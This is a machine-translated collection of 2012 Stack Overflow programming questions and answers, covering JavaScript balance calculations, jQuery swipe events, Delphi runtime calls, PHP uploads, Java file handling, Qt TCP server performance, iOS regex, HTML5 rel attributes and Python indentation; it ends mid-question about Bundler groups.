* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-24T16:01:50.593

'text-size'-setting 在浏览器首选项中设置为'large'。这就是为什么最好总是在页面测量中使用 em

# javascript - 帐户中的负数天数

> ID：10270560
> 
> 赞同：3
> 
> 时间：2012-04-22T17:58:08.377
> 
> 标签：javascript, algorithm

我有一个网站，人们可以在那里销售产品。每次他们添加产品时，他们必须付给我 10 美分。每个用户都有一些可以与银行帐户进行比较的东西。因此，当他们添加产品时，他们的帐户会变为 -10 美分。每个用户只能拥有 x 天的负帐户。

所以我需要一个算法来计算一个账户有多少天是负数。

数据如下：

```
var data = [
  { amount: -10, ago: 15 },
  { amount: 10,  ago: 10 },
  { amount: -10, ago: 5 }
]; 
```

所以这个账户已经连续 5 天为负数了。（在我的应用程序中，我使用日期，但为了简单起见，我在这里使用“几天前”。）

另一个例子：

```
var data = [
  { amount: -10, ago: 15 },
  { amount: -10, ago: 10 },
  { amount: -10, ago: 5 }
]; 
```

此帐户已连续 15 天为负数。

我自己已经解决了这个问题，但也许有更优雅的解决方案？

我对这个问题的解决方案：http: [//jsfiddle.net/SK2By/1/](http://jsfiddle.net/SK2By/1/)

空模板来测试你的算法：http: [//jsfiddle.net/SK2By/](http://jsfiddle.net/SK2By/)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-22T18:29:39.757

这是另一种需要考虑的方法：

```
var negativeDays = function (data) {

    var i, balance = 0, daysNegative = 0;

    for (i = 0; i < data.length; i++) {
        balance += data[i].amount;

        if (balance < 0) {
            if (daysNegative === 0) {
                daysNegative = data[i].ago;
            }
        } else {
            daysNegative = 0;
        }
    }

    return daysNegative;
}; 
```

jsFiddle：http: [//jsfiddle.net/willslab/SK2By/7/](http://jsfiddle.net/willslab/SK2By/7/)

# jquery - jQuery回旋动量滚动

> ID：10270563
> 
> 赞同：0
> 
> 时间：2012-04-22T17:58:31.900
> 
> 标签：jquery, html, mobile, jquery-mobile

有谁知道我将如何通过 jQuery 或 JavaScript 为触摸屏设备实现环形交叉口样式滚动，所以如果我滚动/拖动环形交叉口会随着我滚动而旋转？

有人可以举个例子吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-22T19:40:19.120

您可以捕获“滑动”开始的点，然后跟踪它的运动以确定要做什么：

```
$(document).on('vmousedown', function (event) {

    //the swipe has started, get the starting point saved for later
    $.data(this, 'swipe-start', { x : event.pageX, y : event.pageY });
}).on('vmouseup', function (event) {

    //set the swipe-start date to null to we can start anew,
    //this allows you to fire more than one control event with a single swipe,
    //so long swipes trigger more control events than short ones
    $.data(this, 'swipe-start', null);
}).on('vmousemove', function (event) {
    if ($.data(this, 'swipe-start') != null) {
        //here we can see how far the swipe has gone and in what direction
        var distanceX = $.data(this, 'swipe-start').x - event.pageX,
            distanceY = $.data(this, 'swipe-start').y - event.pageY,
            distanceT = Math.sqrt(Math.pow(Math.abs($.data(this, 'swipe-start').x - event.pageX), 2) + Math.pow(Math.abs($.data(this, 'swipe-start').y - event.pageY), 2));

        //let the user swipe at least 50 pixels before deciding what to do
        if (distanceT > 50) {
            if (distanceX > 0 && distanceY > 0) {
                //user went up and to the right
                $('.ui-content').append('<p>You went up/left</p>');
            } else if (distanceX < 0 && distanceY > 0) {
                //user went up and to the left
                $('.ui-content').append('<p>You went up/right</p>');
            } else if (distanceX < 0 && distanceY < 0) {
                //user went down and to the left
                $('.ui-content').append('<p>You went down/right</p>');
            } else {
                //user went down and to the right
                $('.ui-content').append('<p>You went down/left</p>');
            }
            //reset the 'swipe-start' incase the user keeps swiping
            $.data(this, 'swipe-start', { x : event.pageX, y : event.pageY });
        }
    }
});​ 
```

然后在正确的`if/then`语句中放置控制 UI 元素的代码。

注意`vmousedown`//是用于鼠标和触摸输入的 jQuery Mobile 自定义事件`vmouseup`。`vmousemove`

# 更新

我对上面的代码进行了一些更新，使其更加用户友好，还有一些我必须解决的问题。这是一个工作演示：http: [//jsfiddle.net/sRxFC/1/](http://jsfiddle.net/sRxFC/1/)

请注意，如果您想涉及动量，您还需要跟踪滑动的速度以确定速度而不仅仅是方向。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-22T19:39:22.070

如果你想要自定义滚动路径，那么[这个 jQuery 插件](http://joelb.me/scrollpath/)可能会帮助你......如果你“只是”想在滚动时显示一个环形交叉路口，那么我建议通过 JS 观察滚动事件并通过 CSS 进行一些转换

还是我完全误解了你？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-31T12:09:44.427

我在试用 jQuery 插件 Roundabout 时遇到了这个问题。如果您想要一些开箱即用的东西并且它可以正常工作，我强烈推荐该插件，它能够通过 enableDrag 属性支持拖动/滑动。到目前为止，我只在 iOS 设备上进行了测试，但它在那里运行良好，我想它也可以在其他触摸平台上运行。

[环形交叉口项目页面](http://fredhq.com/projects/roundabout)以及 [如何启用拖动/滑动](http://fredhq.com/projects/roundabout#/enableDrag)

# delphi - Delphi 汇编调用

> ID：10270565
> 
> 赞同：4
> 
> 时间：2012-04-22T17:58:41.493
> 
> 标签：delphi, assembly, reverse-engineering, system-calls, basm

我一直在 IDA 中使用一些 Delphi 程序集。

而且我注意到很多我不理解的系统调用，并且找不到任何关于它们的文档。例如：我注意到很多对未知函数 LStrClr(void *) 的调用。

我能找到的最好的是这个网站[http://www.delphibasics.co.uk/ByLetter.asp?Letter=A](http://www.delphibasics.co.uk/ByLetter.asp?Letter=A) 但它缺少许多函数调用，包括 LStrClr。

非常感谢您的回复，Michael Engstler。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-22T18:16:16.723

`LStrClr`表示长字符串清除。它用于清除长字符串变量。换句话说，当你写：

```
s := ''; 
```

然后编译器将生成对运行时支持函数的调用`_LStrClr`。在 Unicode Delphi 中，它将是`_UStrClr`U 表示的位置`UnicodeString`，而不是`AnsiString`.

没有官方文档，因为它都是私有的实现细节。但是，有 Delphi RTL 的源代码。如果你提到那个，这样的调用很容易理解。

# php - 下面的isset() 函数是否放置正确？

> ID：10270576
> 
> 赞同：1
> 
> 时间：2012-04-22T18:00:01.813
> 
> 标签：php

我在下面有这段代码，问题是它没有上传文件，并且底部的回调 javascript 函数没有显示结果。现在，在我输入 if isset ($_POST[fileImage'])... 代码和`$_SESSION['fileImage']['name'] = $_FILES['fileImage']['name'];`, 然后文件完美上传之前。但是使用这 2 段代码，它已经停止了上传。

所以我认为问题在于我使用的上面的代码放错了地方。如何将下面的代码正确放置在正确的位置以使上传重新开始工作？

以下是假设上传文件但失败的代码：

```
 <?php

    $result = 0;

       if (isset($_POST['fileImage']) && ((($_FILES["fileImage"]["type"] == "image/gif")
    || ($_FILES["fileImage"]["type"] == "image/jpeg")
    || ($_FILES["fileImage"]["type"] == "image/pjpeg")
    || ($_FILES["fileImage"]["type"] == "image/jpg")
    || ($_FILES["fileImage"]["type"] == "image/png")
    || ($_FILES["fileImage"]["type"] == "image/tif"))){

    if( file_exists("ImageFiles/".$_FILES['fileImage']['name'])) {  

        $parts = explode(".",$_FILES['fileImage']['name']);
        $ext = array_pop($parts);
        $base = implode(".",$parts);
        $n = 2;

        while( file_exists("ImageFiles/".$base."_".$n.".".$ext)) $n++;
        $_FILES['fileImage']['name'] = $base."_".$n.".".$ext;

        move_uploaded_file($_FILES["fileImage"]["tmp_name"], 
        "ImageFiles/" . $_FILES["fileImage"]["name"]);
        $result = 1;

    }
        else
          {
          move_uploaded_file($_FILES["fileImage"]["tmp_name"],
          "ImageFiles/" . $_FILES["fileImage"]["name"]);
          $result = 1;

          }

          ?>

<script language="javascript" type="text/javascript">
window.top.stopImageUpload(<?php echo $result;?>);
</script>   

          <?php

    }

      $_SESSION['fileImage']['name'] = $_FILES['fileImage']['name'];

    ?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-22T18:17:42.793

考虑使用一个函数来处理上传：

```
function handleImageUpload()
{
    // was a file uploaded?
    if (!isset($_FILES['fileImage'])) {
        return;
    }
    if (!isImage($_FILES['fileImage'])) {
        // consider throwing an exception here
        return;
    }
    $savepath = getFileSavePath($_FILES['fileImage'], 'ImageFiles/')
    // handle upload
    // ...
}

function isImage($imagepath)
{
    // return boolean 
}

function getFileSavePath($uploadpath, $destinationdirectory)
{
    // return path to save upload without overwriting any existing file
} 
```

考虑使用`pathinfo()`获取有关文件的信息。[http://www.php.net/manual/en/function.pathinfo.php](http://www.php.net/manual/en/function.pathinfo.php)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-22T18:43:46.660

我看到您同时使用`$_FILES["fileImage"]`and`$_POST['fileImage']`并且不确定这是正确的。

您还编写的方式不够干净，无法轻松识别错误..您可以使用它

尝试

```
<?php

$result = 0;
$errors = array ();
$dirImage = "ImageFiles/";

$allowedTypes = array (
        "image/jpeg",
        "image/gif",
        "image/pjpeg",
        "image/jpg",
        "image/png",
        "image/tif" 
);

if (isset ( $_FILES ['fileImage'] ) && $_FILES ["fileImage"] ["error"] == UPLOAD_ERR_OK) {

    $fileName = $_FILES ['fileImage'] ['name'];
    $fileSize = $_FILES ['fileImage'] ['size'];
    $fileTemp = $_FILES ['fileImage'] ['tmp_name'];
    $fileType = $_FILES ['fileImage'] ['type'];

    $fileExt = pathinfo ( $fileName, PATHINFO_EXTENSION );
    $fileExt = strtolower ( $fileExt );

    if (empty ( $fileName ))
        continue;

    if (! in_array ( $fileType, $allowedTypes )) {
        $errors [] = "File Type is not accepted";

    }

    if(!is_writable($dirImage ))
    {
        $errors [] = "File Destination not writeable";
    }

    $fileDst = $dirImage . DIRECTORY_SEPARATOR . $fileName;
    $filePrifix = basename ( $fileName, "." . $fileExt );
    $i = 0;
    while ( file_exists ( $fileDst ) ) {
        $i ++;
        $fileDst = $dirImage . DIRECTORY_SEPARATOR . $filePrifix . "_" . $i . "." . $fileExt;

    }
    // Move the file

    if (count ( $errors ) == 0) {
        if (move_uploaded_file ( $fileTemp, $fileDst )) {
            $result = 1;
        }
    }

}

$_SESSION ['fileImage'] ['name'] = $_FILES ['fileImage'] ['name'];
?> 
```

请注意，错误存储在`$errors`变量中，我建议您将其转换为`json`可以通过您的 JavaScript 代码调用它

# java - Java读取文件并删除行，无法找出错误

> ID：10270578
> 
> 赞同：3
> 
> 时间：2012-04-22T18:00:16.560
> 
> 标签：java, file-io, java.util.scanner

我正在开发一个项目，该项目具有读取文件的方法，找到传入的字符串写入一个名为 temp 的新文件（其中没有传入的行），然后删除原始文件并将 temp 重命名为原始文件姓名。我可以毫无错误地运行它，但它不会将任何内容输出到新文件中。我已经完成了通常的调试，发现错误在于它将行写入新文件的行。我觉得我犯了一个小错误，称错了。任何帮助解决它都会很棒......

这是代码

```
public static void LineDelete(String Filename, String Content) throws IOException {
    try {
        File flights = new File("AppData/" + Filename);
        File temp;
        temp = new File("AppData/temp.txt");
        FileWriter fstream;
        BufferedWriter out;
        try (Scanner sc = new Scanner(flights)) {

            fstream = new FileWriter("AppData/temp.txt", true);
            out = new BufferedWriter(fstream);
            boolean exis = temp.exists();
            if (exis) {
                temp.delete();
                temp = new File("AppData/temp.txt");
                boolean createNewFile = temp.createNewFile();
            } else {
                boolean creatNewFile = temp.createNewFile();
            }
            String f;
            while (sc.hasNextLine()) {
                f = sc.nextLine();
                if (!f.equals(Content)) {

                    out.newLine();
                    out.write(f);

                }

            }
        }
        fstream.close();
        //out.close();
        flights.delete();
        File flightsn = new File("AppData/" + Filename);
        temp.renameTo(flightsn);
    } catch (FileNotFoundException ex) {
        Logger.getLogger(FileWrite.class.getName()).log(Level.SEVERE, null, ex);
    }
} 
```

}

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-22T18:05:46.533

`out`您应该在(BufferedReader)上调用 close 。

您还应该在 try-catch-finally 的 finally 子句中关闭它。

您的代码应该或多或少

```
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.Scanner;
import java.util.logging.Level;
import java.util.logging.Logger;

public class FileWrite {
    public static void LineDelete(String Filename, String Content)
            throws IOException {
        BufferedWriter out = null;
        File flights = new File("AppData/" + Filename);
        File temp = new File("AppData/temp.txt");
        FileWriter fstream = null;

        try {
            Scanner sc = new Scanner(flights);
            fstream = new FileWriter("AppData/temp.txt", true);
            out = new BufferedWriter(fstream);
            boolean exis = temp.exists();
            if (exis) {
                temp.delete();
                temp = new File("AppData/temp.txt");
                boolean createNewFile = temp.createNewFile();
            } else {
                boolean creatNewFile = temp.createNewFile();
            }
            String f;
            while (sc.hasNextLine()) {
                f = sc.nextLine();
                if (!f.equals(Content)) {
                    out.newLine();
                    out.write(f);
                }

            }
        } catch (IOException ex) {
            Logger.getLogger(FileWrite.class.getName()).log(Level.SEVERE, null, ex);
        } finally {
            try {
                out.close();
            } catch (Exception e) {
                Logger.getLogger(FileWrite.class.getName()).log(Level.SEVERE, null, e);
            }
        }

        if(flights.exists()){           
            flights.delete();
            File flightsn = new File("AppData/" + Filename);
            temp.renameTo(flightsn);
        }
    }
} 
```

# python - python 通过 TCP 打开 HTTP 或 HTTPS 会话并监听

> ID：10270580
> 
> 赞同：0
> 
> 时间：2012-04-22T18:00:19.080
> 
> 标签：python, sockets

我需要通过 TCP 打开 HTTP 或 HTTPS 会话并监听从远程服务器发送的事件，谁能指出我正确的方向。一直在玩python的“socket”模块，我是否朝着正确的方向前进......

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-22T18:08:16.423

如果是普通的 HTTP 会话，您应该能够使用典型的网页处理库，例如 urllib2。但是如果你试图在 TCP 级别做一些特别不寻常或不符合标准的事情，比如打开一个 HTTP 会话，但不把它当作一个正常的 HTTP 连接，你应该使用 twisted. Twisted 是一个用于 Python 的网络库，它将为您提供您可能需要的网络级别的所有灵活性。特别是你可能想要这样的东西：http: [//twistedmatrix.com/documents/current/core/howto/clients.html](http://twistedmatrix.com/documents/current/core/howto/clients.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-22T18:04:14.047

看看[BaseHTTPServer](http://docs.python.org/library/basehttpserver.html)（也可用于 HTTPS）。您将需要实现自己的请求处理程序逻辑来处理来自远程应用程序的数据。

# c++ - 具有大量同时客户端的慢 QTcpServer

> ID：10270585
> 
> 赞同：5
> 
> 时间：2012-04-22T18:01:02.157
> 
> 标签：c++, performance, qt, qtcpserver

我正在用 Qt 编写 TCP 服务器，它将为大文件提供服务。应用逻辑如下：

1.  我将 QTcpServer 子类化并重新实现了incomingConnection(int)
2.  在incomingConnection 中，我正在创建“Streamer”类的实例
3.  “Streamer”正在使用 QTcpSocket，它使用来自incomingConnection 的 setSocketDescriptor 初始化
4.  当来自客户端的数据到达时，我从 readyRead() 插槽中发回初始响应，然后将套接字的信号 bytesWritten(qint64) 连接到 Streamer 的插槽 bytesWritten()

bytesWritten 看起来像：

```
Streamer.h:
...
private:
    QFile *m_file;
    char m_readBuffer[64 * 1024];
    QTcpSocket *m_socket;
...

Streamer.cpp
...
void Streamer::bytesWritten() {
    if (m_socket->bytesToWrite() <= 0) {
        const int bytesRead = m_file->read(m_readBuffer, 64 * 1024);
        m_socket->write(m_readBuffer, bytesRead);   
    }
}
... 
```

所以基本上我只在所有待处理数据都完全写入时才写入新数据。我认为这是最异步的方式。

一切正常，除了当有很多同时客户端时它会很慢。

大约有 5 个客户端 - 我从该服务器下载，速度约为 1 MB/s（我的家庭互联网连接的最大值）

拥有大约 140 个客户端 - 下载速度约为 100-200 KB/s。

服务器的互联网连接速度为 10 Gbps，有 140 个客户端，它的使用速度约为 100 Mbps，所以我认为这不是问题。

服务器的内存使用量与 140 个客户端 - 100 MB 的 2GB 可用

服务器的 CPU 使用率 - 最高 20%

我使用的是 800 端口。

当端口 800 上有 140 个客户端并且通过它的下载速度为 100-200 KB/s 时，我在端口 801 上运行了单独的副本，并且以 1 MB/s 的速度下载没有问题。

我的猜测是，不知何故，Qt 的事件调度（或套接字通知器？）太慢而无法处理所有这些事件。

我试过了：

1.  使用 -O3 编译整个 Qt 和我的应用程序
2.  安装libglib2.0-dev并重新编译Qt（因为QCoreApplication使用的是QEventDispatcherGlib或者QEventDispatcherUNIX，所以想看看有什么不同）
3.  使用 streamer->moveToThread() 生成几个线程并在incomingConnection(int) 中取决于当前在特定线程中的客户端数量 - 这没有做出任何改变（尽管我观察到速度变化更大）
4.  使用生成工作进程

代码：

```
main.cpp:
#include <sched.h>

int startWorker(void *argv) {
    int argc = 1;
    QCoreApplication a(argc, (char **)argv);

    Worker worker;
    worker.Start();

    return a.exec();
}

in main():
...
long stack[16 * 1024]; 
clone(startWorker, (char *)stack + sizeof(stack) - 64, CLONE_FILES, (void *)argv); 
```

然后在主进程中启动 QLocalServer 并将 socketDescriptors 从incomingConnection(int socketDescriptor) 传递给工作进程。它工作正常，但下载速度仍然很慢。

也试过：

1.  incomingConnection() 中的 fork()-ing 过程 - 这几乎杀死了服务器:)
2.  为每个客户端创建单独的线程 - 速度降至 50-100 KB/s
3.  将 QThreadPool 与 QRunnable 一起使用 - 没有区别

我正在使用 Qt 4.8.1

我没有主意了。

是与 Qt 相关还是与服务器配置有关？

或者也许我应该使用不同的语言/框架/服务器？我需要为文件提供服务的 TCP 服务器，但我还需要在数据包之间执行一些特定任务，所以我需要自己实现那部分。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-29T18:46:50.353

您的磁盘读取正在阻塞操作，它们将停止任何处理，包括处理新的网络连接等。您的磁盘也具有有限的 I/O 吞吐量，您可以使其饱和。您可能不希望磁盘停止应用程序的其余部分。我认为这里的 Qt 没有任何问题 - 直到您运行分析器并显示 Qt 的 CPU 消耗过多，或者 Qt 以某种方式在事件队列上遇到锁争用（这些是唯一重要的问题） ）。

您应该跨 QObjects 拆分处理，如下所示：

1.  接受传入连接。

2.  处理套接字的写入和读取。

3.  处理传入的网络数据并发出任何非文件回复。

4.  从磁盘读取并写入网络。

当然#1 和#2 是现有的Qt 类。

你必须写#3 和#4。您可能可以将#1 和#2 移动到它们之间共享的一个线程中。#3 和#4 应该分布在多个线程中。应该为每个活动连接创建一个#3 的实例。然后，当发送文件数据时，#3 实例化#4。#4 可用的线程数应该是可调整的，您可能会发现对于特定工作负载有一个最佳设置。您可以以循环方式在它们的线程中实例化 #3 和 #4。由于磁盘访问是阻塞的，用于#4 的线程应该是独占的，不能用于其他任何事情。

当写入缓冲区中剩余的数据少于一定数量时，#4 对象应该执行磁盘读取。这个数量可能不应该为零——如果可能的话，您希望这些网络接口始终保持忙碌，并且用完要发送的数据是让它们闲置的一种可靠方法。

因此，我至少看到了您需要对其进行基准测试的以下可调参数：

1.  minNetworkWatermark - 套接字传输缓冲区中的最低水位。当要写入的字节数少于该字节数时，您从磁盘读取并写入套接字。

2.  minReadSize - 最小磁盘读取的大小。文件读取将是 qMax(minNetworkWatermark - socket->bytesToWrite(), minReadSize)。

3.  numDiskThreads - #4 对象移动到的线程数。

4.  numNetworkThreads - #3 对象移动到的线程数。

You will want to benchmark on different machines to get an idea how fast things can go and what is the effect of tuning. Start the benchmarks from your development machine, whether desktop or notebook. Since it's your daily workhorse, you'd probably notice quickly if there was something wrong with its performance.

# ios - 在 iOS 中查找字符串中的标签

> ID：10270587
> 
> 赞同：0
> 
> 时间：2012-04-22T18:01:02.993
> 
> 标签：ios, regex, string

我不知道该怎么做，我尝试过使用如下代码：

```
NSString *stringToFind = @"Hi";
NSString *fullString = @"Hi Objective C!";
NSRange range = [fullString rangeOfString :stringToFind];
if (range.location != NSNotFound)
{
    NSLog(@"I found something.");
} 
```

但这不符合我的需要，我想搜索一个字符串，如`#customstring`（# 表示标签），其中标签由用户指定，因此他们输入类似这样`Something #hello #world`的内容，我想要做的是搜索所有`#`和附加到它的字符串并将其保存在某处。

**编辑：**创建的标签字符串，我将它保存在一个 plist 中，但是当我保存它时，它只保存一个标签，因为我只是将字符串指定为标签。所以像这样：

```
[db addNewItem:label tagString:tag]; 
```

我需要创建的**所有**标签。例如在我的日志中：

我登录`tag`，这出现了`#tag`，我`tag`用两个这样的标签再次登录`Something #hello #world`我得到两个这样的标签：`#hello`&`#world`每个单独的日志。

我想要的结果是这样的：

`#hello, #world`然后将其存储在一个字符串中并将其保存到我的`DB`.

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-22T18:10:29.140

您应该使用正则表达式：

```
NSString *input = @"Something #hello #world";

NSRegularExpression *regex = [[NSRegularExpression alloc] initWithPattern:@"#\\w+" options:0 error:nil];
NSArray *matches = [regex matchesInString:input options:0 range:NSMakeRange(0, input.length)];

NSLog(@"%d matches found.", matches.count);
for (NSTextCheckingResult *match in matches) {
    NSString *tag = [input substringWithRange:[match range]];
    NSLog(@"%@", tag);
}
// #hello
// #world 
```

* * *

**编辑**要获取没有哈希字符的标签`#`，您应该在正则表达式中使用捕获组，如下所示：

```
NSString *input = @"Something #hello #world";

NSRegularExpression *regex = [[NSRegularExpression alloc] initWithPattern:@"#(\\w+)" options:0 error:nil];
NSArray *matches = [regex matchesInString:input options:0 range:NSMakeRange(0, input.length)];

NSLog(@"%d matches found.", matches.count);
for (NSTextCheckingResult *match in matches) {
    NSString *tag = [input substringWithRange:[match rangeAtIndex:1]];
    NSLog(@"%@", tag);
}
// hello
// world 
```

* * *

**编辑**要获取包含除标签之外的输入字符串的字符串，可以使用以下方法：

```
NSString *stringWithoutTags = [regex stringByReplacingMatchesInString:input options:0 range:NSMakeRange(0, input.length) withTemplate:@""];
NSLog(@"%@", stringWithoutTags);
// Something 
```

* * *

**编辑**现在您有了不同的标签，您可以创建一个包含它们的字符串，如下所示：

```
NSMutableArray *tagsArray = [NSMutableArray array];
for (NSTextCheckingResult *match in matches) {
    NSString *tag = [input substringWithRange:[match range]];
    [tagsArray addObject:tag];
}
NSString *tagsString = [tagsArray componentsJoinedByString:@", "];
NSLog(@"tagsString: %@", tagsString); 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-04-22T18:07:33.583

我会将它拆分为一个由 # 分隔的数组，然后为每个数组再次按空格分隔并为每个数组选择第一个单词：

```
 NSArray *chunks = [string componentsSeparatedByString: @"#"]; 
```

# html - 我们是否应该在站点导航中使用 (HTML5) rel 属性

> ID：10270591
> 
> 赞同：8
> 
> 时间：2012-04-22T18:01:22.807
> 
> 标签：html, navigation, nav, rel

简单直接的问题，但我找不到任何建议。

支持的适当的 HTML5 值是：

*   作者
*   第一的
*   最后的
*   下一个
*   上一页
*   帮助
*   许可证（不是“许可证”）

## 例子

### 由索引、关于、联系方式和法律组成的导航

..从 index.html 页面的角度来看：

*   index.html 与 rel="first"
*   about.html with rel=author next"
*   带有 rel="help" 的contact.html
*   rel="许可最后"的legal.html

...从contact.html页面的角度来看：

*   index.html 与 rel="first"
*   about.html with rel=author prev"
*   带有 rel="help" 的contact.html
*   rel="license next last" 的 legal.html

*我承认在导航中使用 rel 将收效甚微；但它可能会对搜索引擎有所帮助。*

我给出的例子既是为了证明这在实践中是如何工作的，也是为了批评！

亲切的问候，戴尔

## *编辑以下评论中的示例*

### 由索引、关于、联系方式和法律组成的导航

..从 index.html 页面的角度来看：

*   index.html 没有 rel
*   about.html 与 rel=author"
*   带有 rel="help" 的contact.html
*   rel="license" 的 legal.html

...从contact.html页面的角度来看：

*   index.html 没有 rel
*   about.html 与 rel=author"
*   带有 rel="help" 的contact.html
*   rel="license" 的 legal.html

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-22T18:53:34.793

好问题 ！老实说，我不是 rel 属性的专家（所以如果我错了，请有人纠正我），但据我所知，谷歌可以通过该属性验证[网页上的身份。](http://demosthenes.info/blog/411/Using-rel-in-HTML5)如

`<a rel="me" href="https://plus.google.com/110037486217106671520">Luke Southam</a>`

我知道这不是网站导航的主题，但它表明 Google 正在读取`<a></a>`标签内的属性并将其编入索引。至于在网站导航中使用它，如果它（可能）帮助谷歌（或其他搜索引擎）更好地索引你的网站，我说去吧。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-11-24T18:59:06.347

是的，您可以使用`rel`导航中的链接。因为……</p>

…您可以使用`rel`每个*链接*。

使用适当的链接类型，即。您只能在 HTML5 中使用一组特定的[定义和注册`rel`值。](https://stackoverflow.com/a/19866312/1591669)

* * *

### `first`& `last`, `next`&`prev`

`first`并且`last`不再在 HTML5 规范中定义。在 Microformats wiki 页面[现有的 rel 值](http://microformats.org/wiki/existing-rel-values)中，它们被列为 和 的同义词`begin`，`end`定义为：

> 标识当前文档是其节点的文档序列的作者定义的开始[/结束]。

所以它们不适合典型的网站导航。当应按特定顺序阅读链接文档时使用它们。

`next`并在 HTML5 规范`prev`中[定义为：](http://www.w3.org/TR/2013/CR-html5-20130806/links.html#linkTypes)

> [...] 表示文档是序列的一部分 [...]

`first`与上述/的参数相同`last`：仅在有特定顺序时才使用它（对于由“关于”、“联系”、“法律”等组成的导航不是这种情况）。最突出的用途是分页。

### `author`

链接[`author`类型](http://www.w3.org/TR/2013/CR-html5-20130806/links.html#link-type-author)

> 表示引用的文档提供了关于`article`定义超链接的元素的最近元素祖先的作者的进一步信息，如果有的话，或者整个页面的作者，否则。

您只需要确保您的导航（或此`author`链接）不是元素的子`article`元素（这对于站点导航来说非常罕见）。

### `help`

[`help`链接类型](http://www.w3.org/TR/2013/CR-html5-20130806/links.html#link-type-help)定义为：

> 对于`a`和`area`元素，`help`关键字指示引用的文档为定义超链接的元素的父级及其子级提供进一步的帮助信息。

所以这似乎不合适（即使*联系*页面会提供“更多帮助信息”，因为它在技术上是导航本身的帮助（→链接的父元素），而不是整个页面（只有在 中的`link`元素中使用`head`，或者帮助链接是 的直接子级时，才会出现这种情况`body`。）

### `license`

链接[`license`类型](http://www.w3.org/TR/2013/CR-html5-20130806/links.html#link-type-license)

> […] 表示引用的文档提供了提供当前文档主要内容的版权许可条款。

似乎是合适的（如果您的法律页面包含这些条款）。

# contacts - 将联系人添加到通讯录

> ID：10270593
> 
> 赞同：1
> 
> 时间：2012-04-22T18:01:48.833
> 
> 标签：contacts, addressbook

在应用程序中，是否可以将联系人添加到 iPhone 的通讯录？这被苹果接受了吗？

# python - IndentationError：需要一个缩进块

> ID：10270596
> 
> 赞同：2
> 
> 时间：2012-04-22T18:02:12.337
> 
> 标签：python

有人可以告诉我我在这个 Python 代码示例中做错了什么吗？

```
for i in range(len(Adapters)):
print Adapters[i] 
```

我正在尝试列出/打印出数组内容，但代码在打印命令上给了我错误：`IndentationError: expected an indented block`

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-22T18:03:06.423

您需要在`for loop`块内缩进

```
for i in range(len(Adapters)):
    print Adapters[i] 
```

更好的方法是：

```
for item in Adapters:
    print item 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-04-22T18:03:11.620

您需要`print`在 for 循环的主体内缩进语句

```
for i in range(len(Adapters)):
    print Adapters[i] 
```

如果你想简化你的代码，@jamylak 建议的第二个循环是要走的路。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-04-22T18:10:44.160

当您有一个以冒号结尾的短语开头的块时，您需要缩进下一行直到完成。这适用于循环、if 语句等。

```
if 0!=-1:
    print "Good!"

while 0!=-1:
    print "BWAHAHAHA"

for i in range(1,100):
    print i

try:
    print blah
except NameError:
    print "Blah is not defined" 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-04-22T22:20:56.767

正如您的错误所说，您在第二行缺少缩进。与 Java 等其他语言不同，Python 使用缩进来确定语句的分组。它应该是：

```
for i in range(len(Adapters)):
    print Adapters[i] 
```

# objective-c - AVCaptureVideoPreviewLayer 不适用于 renderInContext

> ID：10270604
> 
> 赞同：5
> 
> 时间：2012-04-22T18:03:11.307
> 
> 标签：objective-c, ios, cocoa-touch, uiview, avfoundation

我有一个`AVCaptureVideoPreviewLayer`（可以很好地显示视频全屏），我试图在另一个小视图中显示一个小预览，该小视图已添加为子视图。为此，我试图使用`renderInContext`，但我得到的只是“预览视图”中的黑屏。

```
[[self.captureView.layer.sublayers objectAtIndex:0] renderInContext:context]; 
```

任何其他图层似乎都可以正常工作并显示在我的“预览视图”中，为什么不`AVCaptureVideoPreviewLayer`呢？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-05-15T20:58:37.043

AVCaptureVideoPreviewLayer 被实现为一个 OpenGL 层，它没有实现 renderInContext 以及 CoreAnimation 组合模型的其他一些方面，无论这意味着什么。

在 renderInContext 的 CALayer 文档中引用 Apple [：](http://developer.apple.com/library/ios/DOCUMENTATION/GraphicsImaging/Reference/CALayer_class/Introduction/Introduction.html#//apple_ref/occ/instm/CALayer/renderInContext%3a)

> 重要此方法的 Mac OS X v10.5 实现不支持整个 Core Animation 合成模型。QCCompositionLayer、CAOpenGLLayer 和 QTMovieLayer 图层不会被渲染。此外，不会渲染使用 3D 变换的图层，也不会渲染指定 backgroundFilters、filters、compositingFilter 或掩码值的图层。Mac OS X 的未来版本可能会增加对渲染这些层和属性的支持。

从 iOS 5.1.1 开始，情况仍然如此。

我处理的方法是使用`AVCaptureVideoDataOutput`捕获的样本缓冲区并将其发送到一个方便的代码样本中，该代码样本`imageFromSampleBuffer:`由 Apple 在[技术 QA1702](http://developer.apple.com/library/ios/#qa/qa1702/_index.html)中发布。

# ruby-on-rails - 为什么即使没有捆绑器组也使用 pry？

> ID：10270609
> 
> 赞同：2
> 
> 时间：2012-04-22T18:03:33.697
> 
> 标签：ruby-on-rails, ruby, bundler, pry

[如本文](http://iain.nl/getting-the-most-out-of-bundler-groups)所述，我正在尝试创建一个仅限控制台的捆绑程序组。为了确保事情按预期进行，我在 application.rb 中注释掉了控制台组加载代码，并将捆绑程序组重命名为`:consoleX`. 令我惊讶的是，当我启动 rails 控制台时，pry 仍在加载。

```
group :consoleX do
  gem 'pry'
